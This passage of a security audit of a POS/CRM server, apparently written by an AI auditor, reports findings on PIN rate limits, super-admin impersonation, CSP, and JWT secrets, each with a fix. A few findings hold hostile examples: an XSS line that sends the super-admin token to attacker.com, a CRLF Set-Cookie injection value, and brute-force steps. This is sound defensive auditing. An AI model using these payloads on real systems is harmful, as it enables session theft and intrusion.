A compromised or colluding manager calls `POST /pos/return {invoice_id: X, items: [{line_item_id: 5, quantity: 1, reason: "damaged"}]}` and receives a $200 credit note. They call the same endpoint again immediately with the same payload and receive a second $200 credit note. Stock is also restored twice, creating phantom inventory.

**Fix:**
Add a `pos_return_line_items` table (or `returned_qty` column on `invoice_line_items`) tracking cumulative returned quantity per line item. In the return handler, sum previously returned quantities for each `line_item_id` and reject if `itemQty + already_returned_qty > lineItem.quantity`. Wrap the check and insert atomically.

---

### [MEDIUM] `pos_manager_pin_verified` audit log omits manager identity — approval cannot be attributed

**Where:** `packages/server/src/routes/posEnrich.routes.ts:715-717`

**What:**
When a manager PIN is successfully matched in `/pos-enrich/manager-verify-pin`, the audit record logs the requesting cashier's user ID (`req.user!.id`) and the `sale_cents`, but not the manager's identity. The `match` object contains only `pin` and `role`; the manager's `id` and `username` are not fetched. The response leaks only `match.role` to the client, also without the manager's ID. No audit trail records which specific manager approved a high-value transaction.

**Code:**
```typescript
// posEnrich.routes.ts:689-717:
const managers = await adb.all<{ pin: string | null; role: string | null }>(
  `SELECT pin, role FROM users WHERE ...`  // no id or username selected
);
const match = managers.find(...);
audit(req.db, 'pos_manager_pin_verified', req.user!.id, req.ip || 'unknown', {
  sale_cents: sale,  // no match.id, no manager username
});
```

**Exploit:**
A manager repeatedly approves fraudulent high-value sales for a colluding cashier. The audit log shows "a manager approved it" but cannot identify which manager, blocking forensic attribution and accountability.

**Fix:**
Include `id` and `username` in the `SELECT` from `users` in `manager-verify-pin`. Add `manager_user_id: match.id, manager_username: match.username` to the audit detail payload. Return `manager_user_id` in the response so the client can display the approving manager's name on the receipt.

---

### [MEDIUM] `/auth/verify-pin` and `/auth/switch-user` share the same IP-keyed rate-limit bucket, enabling cross-endpoint reset

**Where:** `packages/server/src/routes/auth.routes.ts:246-255,1443,1529,1596,1626`

**What:**
Both `/auth/switch-user` and `/auth/verify-pin` call the same `checkPinRateLimit` / `recordPinFailure` / `clearPinFailures` functions with `category='pin'` and `key=IP`. A successful `/auth/verify-pin` call (verifying the caller's own PIN) calls `clearPinFailures(db, ip)`, which resets the switch-user brute-force counter for every employee on that IP. An attacker can exhaust 4 switch-user attempts against employee A, call `verify-pin` with their own known PIN to reset the counter, then immediately get 4 more attempts against employee B — indefinitely cycling without ever triggering the 15-minute lockout.

**Code:**
```typescript
// auth.routes.ts:246-255 — shared bucket:
function checkPinRateLimit(db, ip) { return checkWindowRate(db, 'pin', ip, 5, 900000); }
function clearPinFailures(db, ip) { clearRateLimit(db, 'pin', ip); }
// switch-user line 1529: clearPinFailures(db, ip);  // resets ALL endpoints for this IP
// verify-pin line 1626: clearPinFailures(db, ip);   // same reset
```

**Exploit:**
Attacker sends 4 wrong PINs for employee A via `/switch-user` → calls `/verify-pin` with own correct PIN → counter resets → 4 more attempts for employee B. Repeats indefinitely with no lockout. Only needs a valid JWT session.

**Fix:**
Split the rate-limit bucket into separate categories: `'pin_switch'` for `/switch-user` and `'pin_verify'` for `/verify-pin`. Each should be keyed by `(userId, IP)` for per-employee isolation. Clearing on success should only clear the `(category, userId:IP)` tuple, not the entire IP.

---

### [LOW] `bcrypt.compareSync` in `/auth/switch-user` is called O(n) times (one per employee with a PIN) — timing side-channel exposes employee count

**Where:** `packages/server/src/routes/auth.routes.ts:1459-1463`

**What:**
`/auth/switch-user` fetches all active employees with bcrypt-hashed PINs and calls `bcrypt.compareSync` sequentially until a match is found. With bcrypt cost 12 (≈300ms per hash on modern hardware), a store with 10 employees takes ≈3 seconds to respond regardless of which PIN is submitted. An attacker with a valid JWT can infer how many employees have PINs set by measuring response time. This also means response time scales unboundedly as the employee roster grows.

**Code:**
```typescript
// auth.routes.ts:1459-1463:
const usersWithPins = await adb.all<any>(
  "SELECT id, ..., pin ... FROM users WHERE pin IS NOT NULL AND pin LIKE '$2%' AND is_active = 1"
);
const user = usersWithPins.find(u => bcrypt.compareSync(pin, u.pin));
```

**Exploit:**
Attacker submits PINs with different response-time measurements to infer employee PIN count. At scale, O(n) synchronous bcrypt blocks the Node event loop, degrading availability during busy POS periods.

**Fix:**
Move PIN comparison to an async worker-pool or use `bcrypt.compare` (async) in a Promise.all with early-exit. Consider adding a fixed minimum response delay (matching `enforceMinDuration` used on the login path). Alternatively, use a per-employee index: look up by PIN hash prefix or use a server-side session token approach that avoids scanning all employees.

---

### [LOW] Clock-in / clock-out PIN input has no length cap before `bcrypt.compareSync`

**Where:** `packages/server/src/routes/employees.routes.ts:331,429`

**What:**
`POST /:id/clock-in` and `POST /:id/clock-out` pass `pin || ''` directly to `bcrypt.compareSync` without checking the length. While `bcryptjs` (pure-JS) truncates inputs at 72 bytes per the BCrypt specification, the global body parser limit (1 MB) means a caller can submit a 1 MB PIN string that is buffered and parsed before truncation occurs. Compare to `/auth/switch-user` and `/auth/verify-pin` which cap input at 20 characters before the bcrypt call.

**Code:**
```typescript
// employees.routes.ts:331 — no length check:
if (!bcrypt.compareSync(pin || '', user.pin)) {
  recordWindowFailure(...); throw new AppError('Invalid PIN', 401);
}
// auth.routes.ts:1449 — correct pattern:
if (!pin || typeof pin !== 'string' || pin.length < 1 || pin.length > 20) {
  res.status(400).json(...); return;
}
```

**Exploit:**
Low practical risk: bcrypt truncates at 72 bytes and the body parser caps at 1 MB. However the inconsistency means if bcryptjs behavior changes or a different implementation is used, a 1 MB PIN string could stall the event loop during comparison.

**Fix:**
Add `if (!pin || typeof pin !== 'string' || pin.length > 20) throw new AppError('Valid PIN required', 400)` before the bcrypt call in both clock-in and clock-out handlers, matching the pattern in auth.routes.ts.

---

### [INFO] `/pos/return` has role gate (admin/manager) but no configurable PIN gate — inconsistent with sale PIN policy

**Where:** `packages/server/src/routes/pos.routes.ts:2504-2505` vs `packages/server/src/middleware/requirePosPin.ts`

**What:**
When `pos_require_pin_sale` is enabled, completing a sale requires PIN verification via `requirePosPinSale`. However, processing a return (which creates a credit note and restores stock — often higher risk than a sale) has only a role gate (admin/manager) with no configurable PIN requirement. There is no `pos_require_pin_return` config key. A manager session without recent PIN verification can process unlimited returns.

**Exploit:**
N/A — role gate is enforced. Low practical risk absent a stolen manager session.

**Fix:**
Consider adding a `pos_require_pin_return` store_config flag and a `requirePosPinReturn` middleware applied to `POST /pos/return`, consistent with the PIN-on-sale design.

---

### [INFO] `/auth/switch-user` has no `enforceMinDuration` — response time not normalized unlike login

**Where:** `packages/server/src/routes/auth.routes.ts:1438` vs `packages/server/src/routes/auth.routes.ts:702,714`

**What:**
The main login route enforces a minimum response time of 250ms (`enforceMinDuration`) to defeat timing-based enumeration. `POST /auth/switch-user` does not use `enforceMinDuration`. Combined with O(n) bcrypt comparison (see LOW finding above), both timing oracles (response time variance by employee count and by match position) are present.

**Exploit:**
N/A — requires valid JWT. Combined with the O(n) bcrypt side-channel, enables informed brute-force ordering.

**Fix:**
Wrap the switch-user handler body in an `enforceMinDuration` call with a minimum time proportional to the expected maximum number of employees (e.g., `N_employees * 300ms` or a fixed 3000ms cap). This is defense-in-depth against the O(n) timing leak.


---

# S05-master-superadmin

# S05 — Master / Super-Admin Authentication & Authorization

**Auditor:** Claude (Sonnet 4.6) — read-only, 2026-05-05  
**Scope:** masterAuth.ts · localhostOnly.ts · super-admin.routes.ts · super-admin-management.routes.ts · admin/super-admin.html · admin/js/* · masterAudit.ts · db/master-connection.ts

---

## FINDING S05-01 — MEDIUM

**Title:** Impersonation endpoint missing step-up TOTP requirement

**Location:** `packages/server/src/routes/super-admin.routes.ts` line 2582

**Description:**  
`POST /tenants/:slug/impersonate` issues a valid 15-minute tenant-scoped JWT signed with `config.accessJwtSecret` (the same key used for ordinary tenant logins) carrying `impersonated: true`. This token grants full CRM access as the tenant's admin user. Unlike every other destructive super-admin action (suspend, delete, plan-change, backup-restore, config-write, force-disable-2fa, session-kick), this route does **not** include `requireStepUpTotpSuperAdmin(...)`. An attacker who hijacks a super-admin session within the 30-minute JWT window can silently impersonate any tenant's admin without a second TOTP challenge.

**Impact:**  
Session theft → full tenant access without additional friction. The `impersonated: true` flag is carried in the JWT payload but the tenant-side `authMiddleware` does not enforce any additional check based on that flag (confirmed: no references to `impersonated` in `middleware/auth.ts`). The only existing guard is the 15-minute TTL and the session row in the tenant DB.

**Reproduction:**
1. Steal a valid super-admin JWT (XSS, shoulder-surf, shared terminal).
2. `POST /super-admin/api/tenants/<slug>/impersonate` — no TOTP code required.
3. Receive a `bizarre-crm-api` audience token valid for 15 min.

**Recommendation:**  
Add `requireStepUpTotpSuperAdmin('super_admin_impersonate')` to the `/tenants/:slug/impersonate` route, immediately before the async handler, consistent with all other privilege-escalation paths. Also add awareness in `authMiddleware` to optionally flag or restrict `impersonated: true` tokens (e.g., block password-change and 2FA-setup inside an impersonation session).

---

## FINDING S05-02 — LOW

**Title:** `superAdminSecret` has a predictable dev fallback derivable from `JWT_SECRET`

**Location:** `packages/server/src/config.ts` lines ~413-416

**Description:**  
In single-tenant development mode (not production, not `MULTI_TENANT=true`), if `SUPER_ADMIN_SECRET` is unset, the config falls back to:
```ts
crypto.createHash('sha256').update((process.env.JWT_SECRET || 'dev') + ':super-admin-dev-v1').digest('hex')
```
If `JWT_SECRET` is also unset (common in fresh checkouts), the fallback is fully deterministic: `sha256('dev:super-admin-dev-v1')`. An attacker who has read access to the source code and knows this fallback (it is in-repo) can forge valid super-admin JWTs in any dev/single-tenant deployment where neither secret was explicitly set.

**Impact:**  
Low in isolation — production exits fatally if the secret is missing, and multi-tenant also exits. The blast radius is limited to unlocked dev/single-tenant boxes. However, a single-tenant operator who never sets the env var and exposes port 443 is silently vulnerable.

**Recommendation:**  
Generate and log a random ephemeral secret on startup when neither env var is set, rather than using a deterministic derivation. E.g.:
```ts
const ephemeral = crypto.randomBytes(32).toString('hex');
console.warn('[WARN] No SUPER_ADMIN_SECRET set; using ephemeral secret for this process only.');
return ephemeral;
```
This ensures the fallback cannot be pre-computed from public source code.

---

## FINDING S05-03 — LOW

**Title:** Origin-header CSRF guard does not cover `/super-admin/api/*` paths in production

**Location:** `packages/server/src/index.ts` lines 1144–1168 (origin guard), 1468 (route mount)

**Description:**  
The production-only Origin-header guard that rejects state-changing requests without an `Origin` header only applies when `req.path.startsWith('/api/')`. Super-admin routes are mounted at `/super-admin/api/…`, so the guard's early-return (`if (!req.path.startsWith('/api/')) return next()`) silently bypasses it. The CSRF defense for these routes therefore relies entirely on:
1. `localhostOnly` — preventing any request originating outside 127.0.0.1/::1 at the TCP layer.
2. The Content-Type check (JSON required) — which blocks HTML form submissions.
3. Bearer-token authentication (no cookie).

Because the routes use Bearer tokens (not cookies), classical CSRF is not directly exploitable. However, a CSRF via `fetch()` from an arbitrary local page or from a compromised browser extension running on the same host could still reach these endpoints if the browser sends a valid Authorization header. The defense-in-depth coverage gap is noteworthy.

**Impact:**  
Low. Practical exploitation requires co-residency on the same host (same as reaching the loopback interface), and Bearer auth prevents cookie-based CSRF. No direct exploitable path.

**Recommendation:**  
Extend `isPathNoOriginExempt` or the guard's `startsWith` check to also cover `/super-admin/api/` paths, or add an explicit Origin check inside `superAdminAuth` middleware for non-GET methods.

---

## FINDING S05-04 — INFO

**Title:** Audit log IP recorded via `req.ip` (trust-proxy-aware) rather than raw socket

**Location:** `packages/server/src/routes/super-admin.routes.ts` (throughout `auditLog` calls), `packages/server/src/routes/super-admin-management.routes.ts` line 245 (`auditOp`)

**Description:**  
All audit log writes use `req.ip` for the IP address field. Express's `req.ip` honours `X-Forwarded-For` when `trust proxy` is configured. The production config restricts trusted proxies to an explicit allowlist (`TRUSTED_PROXY_IPS` + loopback), which is correctly hardened. However, `localhostOnly` correctly uses `req.socket.remoteAddress` (the actual TCP address), while the audit log uses `req.ip`. If a misconfigured or legitimately-trusted reverse proxy is chained in front and forwards a spoofed `X-Forwarded-For`, the audit trail shows the attacker-controlled IP rather than the real source.

This is distinct from the `localhostOnly` check, which is not bypassable. The audit-log IP is a forensic concern only.

**Impact:**  
INFO. The `localhostOnly` guard prevents any non-local access. Only relevant if the proxy allowlist is misconfigured.

**Recommendation:**  
For maximum audit fidelity, record both `req.ip` and `req.socket.remoteAddress` in the `details` column for sensitive audit actions (tenant create/delete, impersonation, JWT rotation).

---

## FINDINGS SUMMARY

| ID | SEV | Title |
|----|-----|-------|
| S05-01 | MEDIUM | Impersonation endpoint missing step-up TOTP |
| S05-02 | LOW | Predictable dev fallback for `superAdminSecret` |
| S05-03 | LOW | Origin CSRF guard bypassed for `/super-admin/api/*` |
| S05-04 | INFO | Audit IP uses `req.ip` instead of raw socket |

---

---

## PASS 2 — DEEP DIVE

### CRITICAL — `requireStepUpTotpSuperAdmin` queries wrong column names: all step-up-gated endpoints throw 500

**Where:** `packages/server/src/middleware/stepUpTotp.ts:362` vs `packages/server/src/db/master-connection.ts:70–72`

**What:**
`requireStepUpTotpSuperAdmin` (used to gate tenant-delete, plan-update, suspend/activate, backup-restore, JWT rotation, session-kick, config-write, force-disable-2FA, webhook-retry, rate-limit reset, DNS backfill — 17 routes total) queries the `super_admins` table for columns `totp_secret`, `totp_iv`, `totp_tag`. The actual column names in the schema are `totp_secret_enc`, `totp_secret_iv`, `totp_secret_tag`. SQLite/better-sqlite3 throws `SqliteError: no such column: totp_secret` at runtime when the prepared statement executes. Because the async middleware has no try/catch around this query, the error propagates to Express's global error handler, which returns HTTP 500. Every single step-up-gated super-admin endpoint is therefore permanently broken at the runtime level.

**Code:**
```typescript
// stepUpTotp.ts:362 — wrong column names
const dbAdmin = masterDb
  .prepare('SELECT id, email, totp_secret, totp_iv, totp_tag FROM super_admins WHERE id = ? AND is_active = 1')
  .get(superAdmin.superAdminId)

// master-connection.ts:70–72 — actual schema columns
totp_secret_enc TEXT,
totp_secret_iv TEXT,
totp_secret_tag TEXT,
```

**Exploit:**
Any authenticated super-admin calling `DELETE /super-admin/api/tenants/:slug`, `PUT /tenants/:slug`, `POST /tenants/:slug/suspend`, or any other step-up-gated operation receives 500 and cannot complete the action. This is a complete operational DoS on all destructive fleet-management actions. Conversely, if the error were silently swallowed (e.g., by a future try/catch patch that returns next()), every step-up gate would fail open, bypassing TOTP for all destructive operations.

**Fix:**
Change line 362 of `stepUpTotp.ts` to `SELECT id, email, totp_secret_enc, totp_secret_iv, totp_secret_tag FROM super_admins` and update the TypeScript type and all references on lines 363–409 accordingly. Add an integration test that calls a step-up-gated route and verifies it demands TOTP, not 500.

---

### HIGH — `spaCsp` allows `'unsafe-inline'` script-src on the super-admin SPA served to localhost

**Where:** `packages/server/src/index.ts:1495`

**What:**
The Content-Security-Policy applied to the super-admin SPA (`/super-admin/*`) is `script-src 'self' 'unsafe-inline'`. The comment at line 1492 acknowledges this is required by "Vite's bundle" using "small inline scripts to bootstrap modules." However, `'unsafe-inline'` allows any injected script tag (e.g., via stored XSS in an API response value that gets `innerHTML`-rendered) to execute. Given that the SPA renders tenant data (tenant names, slugs, usernames, announcement text, audit log details, user-agents, IP addresses, notification recipients) from untrusted sources, a stored XSS in any of those fields could leverage `'unsafe-inline'` to exfiltrate the super-admin session token stored in `sessionStorage` or perform any action as the super-admin.

**Code:**
```typescript
// index.ts:1495
const spaCsp = "default-src 'self'; script-src 'self' 'unsafe-inline'; script-src-attr 'none'; " +
  "style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' ws: wss:; " +
  "font-src 'self' data:; frame-ancestors 'none'";
```

**Exploit:**
If a tenant slug, shop name, or announcement body contains a stored XSS payload that reaches an `innerHTML` sink in the React SPA (whose own sanitization may have gaps), the `'unsafe-inline'` CSP permits script execution. The attacker could steal `sessionStorage.getItem('sa_token')` and call any super-admin API endpoint, including impersonation of any tenant.

**Fix:**
Use a nonce-based or hash-based `script-src` for the Vite bundle rather than `'unsafe-inline'`. Vite supports injecting a per-request nonce via the `vite-plugin-csp` or by configuring `build.modulePreload.polyfill: false` and using `<script type="module">` with a nonce. This is the standard solution for Vite + CSP. Alternatively, use `'strict-dynamic'` with a nonce.

---

### HIGH — `/admin` HTML page and `/admin/js/*` static files served without `localhostOnly`

**Where:** `packages/server/src/index.ts:1473, 1782`

**What:**
`/super-admin/*` is gated by `localhostOnly` middleware. However, `/admin` (the legacy single-tenant admin panel HTML) and `/admin/js/*` (the JavaScript files for BOTH admin panels — `admin.js` and `super-admin.js`) are served WITHOUT `localhostOnly`. Any remote attacker who can reach the server's TCP port can download `super-admin.js`, read the full super-admin API surface, endpoint paths, login flow, TOTP flow, session storage key name (`sa_token`), and authentication header format (`Authorization: Bearer`). This is an information disclosure that significantly aids reconnaissance.

**Code:**
```typescript
// index.ts:1473 — no localhostOnly
app.use('/admin/js', express.static(path.resolve(__dirname, 'admin/js'), { index: false }));

// index.ts:1782 — no localhostOnly
app.get('/admin', (req, res) => {
  res.setHeader('Content-Security-Policy', adminCsp);
  res.sendFile(path.resolve(__dirname, 'admin/index.html'));
});
```

**Exploit:**
An external attacker GETs `https://crm.example.com/admin/js/super-admin.js` and receives the full JavaScript source. They learn the exact API paths, authentication mechanism, token storage key, and step-up TOTP header name — reducing the time-to-exploit for any further vulnerability they discover.

**Fix:**
Add `localhostOnly` middleware to both the `/admin/js` static mount and the `/admin` GET route:
```typescript
app.use('/admin/js', localhostOnly, express.static(...));
app.get('/admin', localhostOnly, (req, res) => { ... });
```

---

### MEDIUM — Backup download `Content-Disposition` header injection via unquoted double-quote in filename

**Where:** `packages/server/src/routes/super-admin.routes.ts:1480`

**What:**
The `rejectUnsafeFilename` guard (line 1360–1368) blocks `..`, `/`, `\`, null bytes, and Windows device names, but does NOT strip or reject the `"` (double-quote) character or `\r\n`. The filename is then embedded verbatim in the `Content-Disposition` response header inside double quotes: `attachment; filename="${filename}"`. A backup file whose name contains a double quote (possible if the backup service generates filenames from tenant slugs containing special chars, or if an operator manually names a file) would break the RFC 6266 header structure and could allow response header injection if CRLF bytes appear.

**Code:**
```typescript
// super-admin.routes.ts:1480
res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
```

**Exploit:**
An attacker with super-admin access and the ability to name a backup file (via the backup-settings path parameter) to contain `";\r\nSet-Cookie: admin=pwned` could inject a `Set-Cookie` header into the download response. Blast radius is limited: requires existing super-admin access, and modern browsers reject CRLF in header values (Node/Express also sanitizes these). Realistic impact is header structure breakage.

**Fix:**
Sanitize the filename for `Content-Disposition` use: either percent-encode it (`encodeURIComponent(filename)` and use `filename*=UTF-8''...` per RFC 5987), or add `"` and `\r\n` to the `rejectUnsafeFilename` guard.

---

### LOW — `super-admin.js` stores session token in `sessionStorage` (XSS-accessible)

**Where:** `packages/server/src/admin/js/super-admin.js:2, 148`

**What:**
The super-admin SPA stores the bearer token in `sessionStorage` (`sessionStorage.setItem('sa_token', token)`). While `sessionStorage` does not persist across browser sessions like `localStorage`, it is equally accessible to JavaScript running on the same page origin, including via XSS. Since the SPA uses `'unsafe-inline'` CSP (see S05-P2-02 above), any XSS payload can read `sessionStorage.getItem('sa_token')` and exfiltrate the 30-minute super-admin JWT.

**Code:**
```javascript
// super-admin.js:2
let token = sessionStorage.getItem('sa_token');
// super-admin.js:148
sessionStorage.setItem('sa_token', token);
```

**Exploit:**
XSS in the SPA (enabled by `'unsafe-inline'` CSP) runs `fetch('https://attacker.com/?t=' + sessionStorage.getItem('sa_token'))` and exfiltrates the super-admin JWT. With that token the attacker can call read-only super-admin endpoints immediately, or wait for the step-up TOTP column-name bug to be fixed and then escalate.

**Fix:**
Store the token only in a `httpOnly` cookie (requires a login-endpoint cookie response and `credentials: 'include'` in fetch calls) so JavaScript cannot access it at all. If sessionStorage is retained, fix the CSP `'unsafe-inline'` gap first.

---

### LOW — `requireStepUpTotpSuperAdmin` TOTP replay window covers adjacent-but-distinct super-admins

**Where:** `packages/server/src/middleware/stepUpTotp.ts:87–103`

**What:**
The TOTP replay-prevention `claimCode(userId, code)` keys consumed codes on `userId:code:windowBucket`. For `requireStepUpTotpSuperAdmin`, `userId` is `superAdminId`. In a system with two super-admins (A and B), super-admin A consuming code `123456` only blocks A from replaying it. Super-admin B could simultaneously use the same code `123456` (valid because they share the same TOTP secret management pattern — but in practice each has a unique secret). This is correct behavior because B's TOTP secret is different. However, the key design note is worth verifying: if a future multi-super-admin scenario ever reuses a TOTP secret across super-admins (e.g., a shared TOTP during onboarding), the replay guard is keyed on super-admin ID, not on the actual TOTP secret, so the cross-admin isolation holds only when secrets are unique.

**Code:**
```typescript
// stepUpTotp.ts:87–103
function claimCode(userId: number, code: string): boolean {
  const bucket = Math.floor(Date.now() / 30_000);
  const keys = [`${userId}:${code}:${bucket-1}`, `${userId}:${code}:${bucket}`, `${userId}:${code}:${bucket+1}`];
  for (const k of keys) { if (consumedCodes.has(k)) return false; }
  for (const k of keys) { consumedCodes.set(k, Date.now()); }
  return true;
}
```

**Exploit:**
No direct exploit as long as each super-admin has a unique TOTP secret. If shared secrets are ever introduced (e.g., a backup TOTP device for a team), replay prevention becomes per-person rather than per-secret, which could allow one actor to replay another's consumed code.

**Fix:**
Key consumed codes on `secret_fingerprint:code:bucket` (first 8 chars of the decrypted secret's SHA-256) rather than `userId:code:bucket`. This ensures uniqueness per TOTP secret regardless of how many super-admins share an account setup.

---

### INFO — `POST /announcements` not gated by step-up TOTP despite writing platform-wide content

**Where:** `packages/server/src/routes/super-admin.routes.ts:1792`

**What:**
`POST /announcements` (creates a platform-wide announcement visible to all tenants) requires only super-admin session auth, not step-up TOTP. In contrast, less consequential operations like resetting rate limits or updating backup settings require step-up. A hijacked 30-minute super-admin token can create arbitrary announcements (up to 10,000 chars) without an additional TOTP challenge. Announcement body is stored as plaintext and rendered by the tenant dashboard; if the tenant dashboard renders announcement body as HTML without escaping, this becomes a stored XSS vector.

**Fix:**
Add `requireStepUpTotpSuperAdmin('super_admin_announcement_create')` to `router.post('/announcements', ...)` for defense-in-depth. Also verify the tenant dashboard escapes announcement body before rendering.

---

### INFO — Audit log `GET /audit-log` has no date-range filter or offset pagination

**Where:** `packages/server/src/routes/super-admin.routes.ts:1721–1731`

**What:**
The audit log endpoint accepts `?limit` (capped to 100 by `parsePageSize`) and always orders by `created_at DESC`. There is no `offset` parameter, no cursor, and no date filter. On a long-running fleet with thousands of audit entries, the endpoint can only ever return the 100 most recent entries. Forensic review of historical actions (e.g., verifying who deleted a tenant 3 months ago) is impossible without direct DB access.

**Fix:**
Add `?before=<ISO-timestamp>` cursor pagination or `?offset=` support so auditors can page through the full log programmatically.

---

## PASS 2 ADDITIONAL VERIFIED CLEAN

- **Column-name mismatch functional impact:** The `totp_secret_enc`/`totp_secret_iv`/`totp_secret_tag` naming is correct in `super-admin.routes.ts` login (lines 475–508) and in `stepUpTotp.ts` `decryptSuperAdminTotpSecret` (line 321). Only the SELECT query at stepUpTotp.ts:362 uses wrong short names.
- **localhostOnly on super-admin API routes:** `app.use('/super-admin/api', localhostOnly, superAdminRoutes)` at index.ts:1465 is correct. The gap is only the legacy `/admin` HTML and `/admin/js` static files.
- **`df` shell injection:** `t.mount` values in `/system/disk-space` are hardcoded server-side constants (REPO_ROOT + fixed subdirs), not user-controlled.
- **`execSync` command construction:** In `management.routes.ts` the PM2 args are passed as array to `spawnSync` (never shell-interpolated). The `df -k "${t.mount}"` in `management.routes.ts:480` uses a hardcoded path — acceptable.
- **Announcement XSS:** The super-admin SPA renders announcement body via `esc()` (verified in super-admin.js renderAuditTab / renderDashboard). The tenant-side rendering is out of scope for this slot.
- **`/admin-uploads` path traversal:** Double-guard (URL decode + `path.resolve` containment check) at index.ts:1421–1430 is solid.
- **Super-admin TOTP replay in `claimCode`:** Shared `consumedCodes` Map is process-local; in a clustered/PM2 multi-process deploy, replay prevention does not work across worker processes. This is an existing architectural limitation noted for completeness.

## PASS 2 FINDINGS SUMMARY

| ID | SEV | Title |
|----|-----|-------|
| S05-P2-01 | CRITICAL | `requireStepUpTotpSuperAdmin` wrong column names → 500 on all step-up endpoints |
| S05-P2-02 | HIGH | Super-admin SPA CSP allows `'unsafe-inline'` script-src |
| S05-P2-03 | HIGH | `/admin` HTML and `/admin/js/*` served without `localhostOnly` |
| S05-P2-04 | MEDIUM | Backup download `Content-Disposition` header injection via `"` in filename |
| S05-P2-05 | LOW | Super-admin JWT stored in `sessionStorage` (XSS-accessible) |
| S05-P2-06 | LOW | TOTP replay key is per-userId not per-secret (multi-process gap) |
| S05-P2-07 | INFO | `POST /announcements` missing step-up TOTP gate |
| S05-P2-08 | INFO | Audit log endpoint lacks offset pagination for forensic review |

---

## VERIFIED CLEAN (no findings)

- **Hardcoded credentials / default passwords:** No hardcoded passwords in super-admin creation path. `master-connection.ts` explicitly seeds NO default super admin — setup is deferred to first-run wizard. DUMMY_HASH in login is a bcrypt hash of a random string, not a usable credential.
- **localhost-only enforcement / X-Forwarded-For bypass:** `localhostOnly` correctly uses `req.socket?.remoteAddress`, not `req.ip`. Not bypassable via header spoofing.
- **Master JWT / tenant JWT key confusion:** Separate secrets (`config.superAdminSecret` vs `config.accessJwtSecret`). Separate audiences (`bizarre-crm-super-admin` vs `bizarre-crm-api`). Separate algorithm pinning with explicit `VerifyOptions` in both middlewares.
- **Cross-tenant data exposure:** All tenant-data reads inside super-admin routes use `getTenantDb(slug)` with pool-managed handles and path-containment guards. No wildcard tenant access.
- **Audit log tampering:** No API endpoint exposes DELETE or TRUNCATE on `master_audit_log`. The only deletion is a server-internal 730-day retention cron, not operator-accessible. No super-admin UI route touches audit rows.
- **XSS via unescaped tenant data in admin HTML:** Both `admin.js` and `super-admin.js` define and consistently call `esc()` (HTML entity escape) for all dynamic values inserted into innerHTML. DOM methods (`createElement`, `textContent`, `addEventListener`) are used for complex list rendering.
- **CSRF on super-admin endpoints:** Bearer token auth (no cookies) makes classical CSRF non-exploitable. The content-type guard (JSON required) blocks HTML form submissions. `localhostOnly` blocks all remote access at the TCP layer. See S05-03 for a defense-in-depth gap.
- **Reset/drop-tenant with insufficient confirmation:** `DELETE /tenants/:slug` requires `requireStepUpTotpSuperAdmin` step-up. All lifecycle operations (suspend, activate, delete, repair) audit both before and after state.
- **Hardcoded Host check bypass:** No Host-header-based access control; access control is via raw socket IP (`localhostOnly`).


---

# S06-jwt-secrets

# S06 — JWT Secret Management, Signing & Verification

**Scope:** `packages/server/src/utils/jwtSecrets.ts`, `config.ts`, all `jwt.sign` / `jwt.verify` / `jwt.decode` call sites.

**Auditor:** Claude (read-only)  
**Date:** 2026-05-05

---

## Findings

### F-S06-01 — MEDIUM — Weak fallback dev-secret in .env.example is an active value (not commented)

**File:** `/Users/serega/BizarreCRM/.env.example` line 22  
**Code:**
```
JWT_SECRET=change-me-to-a-random-string
```
`.env.example` is committed to git (`git ls-files` confirms). The `JWT_SECRET` entry is a live `KEY=VALUE` assignment, not commented out. Any developer who `cp .env.example .env` and starts the server immediately runs with `JWT_SECRET=change-me-to-a-random-string`. The production guard in `config.ts` blocks this in `NODE_ENV=production`, but the dev fallback still produces HKDF-derived secrets whose root material is fully public. A team-wide "dev" deployment (e.g. staging with `NODE_ENV=development`) would have no protection.

**All other env secrets in `.env.example` (`SUPER_ADMIN_SECRET`, `ACCESS_JWT_SECRET`, `REFRESH_JWT_SECRET`) are correctly commented out — only `JWT_SECRET` is left active.**

**Recommendation:** Comment out `JWT_SECRET` in `.env.example` (e.g. `# JWT_SECRET=<generate: openssl rand -hex 64>`). Provide a generation command so first-time operators know what to do.

---

### F-S06-02 — MEDIUM — `/admin-uploads` handler verifies JWT but skips session revocation check

**File:** `/Users/serega/BizarreCRM/packages/server/src/index.ts` lines ~1403–1430  
**Description:**  
The inline super-admin JWT check on `app.use('/admin-uploads', localhostOnly, ...)` verifies the token signature, algorithm, issuer, and audience, and checks `payload.role === 'super_admin'` — but **does not verify that the session still exists in `super_admin_sessions`**.

All three other super-admin gatekeepers do perform the session check:
- `super-admin.routes.ts` `superAdminAuth()` — queries `super_admin_sessions` and `super_admins`.
- `management.routes.ts` `managementAuth()` — same session + admin-active check.
- `admin.routes.ts` `adminAuth()` — same (conditional on `masterDb` availability — see F-S06-03).

A super-admin token that has been revoked (logout, account disabled) can still access `/admin-uploads` within the 30-minute token TTL (configured in `SUPER_ADMIN_JWT_SIGN_OPTIONS`). The route is behind `localhostOnly` (TCP-layer), which limits exposure to localhost attackers (e.g. compromised local process, developer machine), not remote attackers.

**Severity rationale:** Mitigated by `localhostOnly` and the 30-minute token TTL. Not a remote exploit, but inconsistent with the revocation model applied everywhere else for this privilege tier.

**Recommendation:** Add the same `super_admin_sessions` + `super_admins.is_active` check to the `/admin-uploads` handler, or extract a shared `superAdminAuthInline(token)` helper and reuse it.

---

### F-S06-03 — LOW — `admin.routes.ts` session check is conditional on `masterDb != null`; null DB silently skips revocation

**File:** `/Users/serega/BizarreCRM/packages/server/src/routes/admin.routes.ts` lines 151–170  
**Code:**
```ts
const masterDb = getMasterDb();
if (masterDb && payload.sessionId) {      // skipped if masterDb is null
  // session expiry check
}
if (masterDb && payload.superAdminId) {   // skipped if masterDb is null
  // is_active check
}
return next();                            // always reached if role === 'super_admin'
```
If `getMasterDb()` returns `null` (e.g. during a DB initialisation race at startup, or after a deliberate DB connection failure), both the session-expiry and account-active checks are skipped entirely, and the request is allowed through with only a valid JWT signature.

**Severity rationale:** `getMasterDb()` returning null should be extremely rare in practice. However, the code silently proceeds rather than failing closed. In the worst case a forcibly-null master DB state allows access with any valid (even revoked) super-admin JWT.

**Recommendation:** Fail closed: if `masterDb` is unavailable, return 503 / 401 rather than granting access.
```ts
const masterDb = getMasterDb();
if (!masterDb) {
  return res.status(503).json({ success: false, message: 'Master DB unavailable' });
}
```

---

### F-S06-04 — LOW — TOTP legacy v0 key is `sha256(jwtSecret)` — collocated with JWT signing key material

